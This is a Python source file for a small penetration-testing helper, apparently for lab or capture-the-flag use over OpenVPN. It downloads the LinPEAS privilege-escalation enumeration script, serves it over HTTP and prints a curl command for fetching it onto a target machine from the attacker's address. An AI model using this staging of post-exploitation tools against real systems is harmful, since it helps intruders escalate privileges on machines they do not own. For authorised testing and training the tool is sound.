import requests
import os
import socketserver
import threading
import netifaces as ni
from utils.security import SecurityHTTPRequestHandler
import psutil
import json
import typer
from typing_extensions import Annotated

# get config
with open("./config.json", "r") as f:
    config = json.load(f)

LINPEAS_URL = config["LINPEAS_URL"]
DEFAULT_PORT = config["DEFAULT_PORT"]
DEFAULT_INTERFACE = config["DEFAULT_INTERFACE"]

def get_linpeas():
    linpeas_contents = requests.get(LINPEAS_URL)

    if linpeas_contents.status_code != 200:
        print("Error while getting Linpeas!")
        return

    # Assemble     
    path_list = os.path.realpath(__file__).split("/")[1:-1]
    path = ""
    
    for p in path_list:
        path += "/"+p

    with open(f"{path}/l.sh", "w") as f:
        f.write(linpeas_contents.content.decode('utf-8'))

    print(f"Saved to {path}/l.sh")

def serve(port):
    handler = SecurityHTTPRequestHandler

    with socketserver.TCPServer(("", port), handler) as httpd:
        httpd.serve_forever()

def get_interface(interface):
    # this isnt perfect but will work

    interfaces = psutil.net_if_addrs().keys()

    if interface in interfaces:
        return interface

    if DEFAULT_INTERFACE in interfaces:
        return DEFAULT_INTERFACE

    return next(iter(interfaces))

def main(
    port: Annotated[int, typer.Option(help="The port which will be used. (--port 1337)")] = DEFAULT_PORT,
    inf: Annotated[str, typer.Option(help="The network interface of the OpenVPN connection. (--inf utun7)")] = DEFAULT_INTERFACE,
    renew_linpeas: Annotated[bool, typer.Option("--no-renew", help="If it should get the newest version of Linpeas. (--no-renew)")] = False,
):
    # Step 1: get Linpeas
    if not renew_linpeas:
        print("Getting Linpeas...")
        get_linpeas()

    # Step 2: provide linpeas
    t = threading.Thread(target=serve, args=(port,))
    t.start()

    # Step 3: get IP from OpenVPN Connection
    ip = ni.ifaddresses(get_interface(inf))[ni.AF_INET][0]['addr']

    # Step 4: provide user with information
    print(f"Get linpeas with: curl -L http://{ip}:{port}/l.sh > l.sh | chmod +x l.sh")

if __name__ == "__main__":
    main(1234, "en0", False) # for testing and debbuging
